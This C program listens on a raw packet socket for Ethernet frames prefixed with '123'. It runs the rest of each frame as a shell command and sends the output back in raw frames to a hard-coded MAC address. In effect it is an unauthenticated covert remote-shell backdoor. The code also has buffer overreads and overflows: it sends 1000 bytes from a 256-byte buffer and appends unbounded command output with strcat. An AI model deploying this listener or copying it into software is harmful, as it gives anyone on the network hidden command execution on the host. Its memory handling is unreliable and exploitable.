#include <stdio.h>
#include <stdlib.h> /* exit(), atoi() */
#include <sys/socket.h>
#include <string.h> /* bzero, bcopy, strlen */
#include <linux/if_ether.h> /* ETH_P_ALL */
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <netinet/in.h>
#include <unistd.h>

char* exec(const char* cmd);
void error(char* text);

int main(int argc, char* argv[]) {
  int sockfd, j, text;
  struct sockaddr_ll servaddr;
  char buffer [256], command[256];
  char check[] = "123";
  unsigned char src_mac[6] = {0x00, 0x01, 0x02, 0xFA, 0x70, 0xAA};
  unsigned char self_mac[6] = {0x00, 0x04, 0x75, 0xC8, 0x28, 0xE5};
  char* result;

  /* creating a socket */
  sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if(sockfd < 0) {
    error("Error opening socket");
  }

  /* setting the things up */
  servaddr.sll_family = PF_PACKET;
  servaddr.sll_protocol = htons(ETH_P_IP);
  servaddr.sll_ifindex = 2;
  servaddr.sll_hatype = ARPHRD_ETHER;
  servaddr.sll_pkttype = PACKET_OTHERHOST;
  servaddr.sll_halen = ETH_ALEN;

  for(j = 0; j < 6; j++)
    servaddr.sll_addr[j] = src_mac[j];

  servaddr.sll_addr[6] = 0x00;
  servaddr.sll_addr[7] = 0x00;

  /* waiting and reseiving */
  socklen_t l = sizeof servaddr;

  for(j = 0; j < 50; j++) {
    printf("%i) Waiting for command...\n", j);

    if(recvfrom(sockfd, buffer, 256, 0, (struct sockaddr*)&servaddr, &l) < 0)
      error("Error on receiving");
    if(strncmp(check, buffer, strlen(check)) == 0)
      break;
    sleep(1);
    strcpy(buffer, "123echo 'A command has not been received'\n");
  }
  /*strcpy(buffer, "123ls | grep myserv");*/

  memmove(command, buffer + sizeof(check) - 1, 
    sizeof(buffer) - sizeof(check) + 1);

  /* executing */
  command[strlen(command) - 1] = 0;
  result = exec(command);

  strcpy(buffer, check);
  strcat(buffer, result);
  printf("Sending packet: %s\n", buffer);

  /* reporting to client */
  for(j = 0; j < 200; j++) {
    if(sendto(sockfd, buffer, 1000, 0, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0)
      error("Error on sending");
    else
      printf("%i) Sending...\n", j);
    sleep(1);
  }

  close(sockfd);

  return 0;
}

char* exec(const char* cmd) {
  printf("The command is: %s\n", cmd);
  int l;
  static char buff[1000], tmp[128]; /* what size is needed? */
  FILE* pipe = popen(cmd, "r");
  if(pipe == NULL)
    error("Pipe stream opening failed.");

  while (fgets(tmp, sizeof(tmp), pipe) != NULL) {
    strcat(buff, tmp); 
  }

  l = strlen(buff);
  buff[l-1] = '\0'; 

  pclose(pipe);
  printf("command output1: %s of length %i\n", buff, l);

  return buff;
}

void error(char* text) {
  perror(text);
  exit(1);
}
